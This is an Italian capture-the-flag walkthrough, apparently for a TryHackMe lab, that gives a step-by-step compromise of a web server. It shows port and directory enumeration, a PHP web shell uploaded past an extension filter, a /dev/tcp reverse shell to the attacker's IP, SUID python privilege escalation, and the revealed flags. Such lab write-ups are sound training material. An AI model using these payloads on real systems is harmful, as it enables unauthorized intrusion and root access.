@@ -1,0 +1,159 @@
+### INFORMATION GATHERING ###
+
+─ nmap -Pn -sV 10.10.168.16 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 13:58 CEST
+Nmap scan report for 10.10.168.16
+Host is up (0.058s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+─ http://10.10.168.16/ -> gobuster
+
+╰─ gobuster dir -u http://10.10.168.16/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.168.16/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.168.16/css/]
+/index.php            (Status: 200) [Size: 616]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.168.16/js/]
+/panel                (Status: 301) [Size: 312] [--> http://10.10.168.16/panel/]  <- interessante  (facendo un gobuster su http://10.10.168.16/panel/ non ottengo niente)
+/server-status        (Status: 403) [Size: 277]
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.168.16/uploads/] <- interessante (idem qui)
+Progress: 4727 / 4727 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+vado qui: http://10.10.168.16/panel/ vedo che posso uploadare dei file, che probabilmente poi potrò vedere nella directory http://10.10.168.16/uploads/
+infatti è così
+
+### EXPLOITATION ###
+
+cerco quindi "file upload bypass"
+
+facendo burp ed intercettando la richiesta di quando uploado i file vedo che:
+
+POST /panel/ HTTP/1.1
+Host: 10.10.168.16
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------112958648512272434352202684131
+Content-Length: 400
+Origin: http://10.10.168.16
+Connection: close
+Referer: http://10.10.168.16/panel/
+Cookie: PHPSESSID=63up4k6cpr6adod7u53gfleajg
+Upgrade-Insecure-Requests: 1
+
+-----------------------------112958648512272434352202684131
+Content-Disposition: form-data; name="fileUpload"; filename="shell2.sh"
+Content-Type: application/x-shellscript
+
+sh -i >& /dev/tcp/10.8.107.68/9001 0>&1
+
+-----------------------------112958648512272434352202684131
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------112958648512272434352202684131--
+
+
+provo a modificarlo seguendo i comandi sul sito: https://medium.com/@madhuhack01/insecure-file-upload-basic-bypass-76d1b9197e4c
+
+e così modifico la richiesta HTTP intercettata come segue:
+
+POST /panel/ HTTP/1.1
+Host: 10.10.168.16
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------112958648512272434352202684131
+Content-Length: 400
+Origin: http://10.10.168.16
+Connection: close
+Referer: http://10.10.168.16/panel/
+Cookie: PHPSESSID=63up4k6cpr6adod7u53gfleajg
+Upgrade-Insecure-Requests: 1
+
+-----------------------------112958648512272434352202684131
+Content-Disposition: form-data; name="fileUpload"; filename="cmd.php" <-- modificato
+Content-Type: application/x-shellscript
+
+<?php system($_GET[‘cmd’]); ?>  <-- modificato
+
+-----------------------------112958648512272434352202684131
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------112958648512272434352202684131--
+
+ma dal repeater e inviando la richiesta modificata il server mi risponde che non accetta i file .php quindi cerco di mascherarlo per farlo inviare lo stesso
+e trovo il sito (sempre facendo la stessa ricerca di prima): https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass
+
+
+
+### REVERSE SHELL ###
+
+Quindi vedo che i file php non li accetta, e provo a modificarli usando tipo l'estensione .php5 che è equivalente, me li uploada, quindi ora provo a mettere una reverse shell nel codice e lo prendo dal sito:
+(cercando "php reverse shell" trovo il sito)
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+dal codice cambio l'ip e la porta, e metto il mio ip e come porta 9001, una volta fatto ciò mi metto in ascolto con netcat: nc -lvnp 9001
+
+e carico il file come file.php5 
+una volta fatto ciò devo far eseguire il file dal server, e come faccio? clicco sul file e vedo che mi dà una reverse shell :))
+
+per trovare la stringa dell'utente faccio: find / -type f -name user.txt 2> /dev/null 
+e trovo che si trova in: /var/www/user.txt
+facendo:
+$ cat /var/www/user.txt
+THM{y0u_g0t_a_sh3ll}
+
+
+
+### PRIV ESC ###
+
+Cerco dei file che hanno il SUID attivo con il comando: find / -user root -perm /4000
+e vedo che ho la cartella: /usr/bin/python 
+
+Quindi cerco su GTFOBins qualche roba per python che includa il SUID, quindi vado in quella parte di sito:
+e vedo che ho:
+'''
+sudo install -m =xs $(which python) .
+
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+'''
+
+=> facendo python -c 'import os; os.execl("/bin/sh", "sh", "-p")' (mi va in attesa, e facendo whoami, mi da "root")
+
+quindi ora con il comando: find / -type f -name root.txt 2> /dev/null <- cerco il flag del root
+mi dice che si trova in:
+/root/root.txt
+
+quindi faccio il cat del file
+cat /root/root.txt
+THM{pr1v1l3g3_3sc4l4t10n} <- trovo la flag root
+
+FINE :)
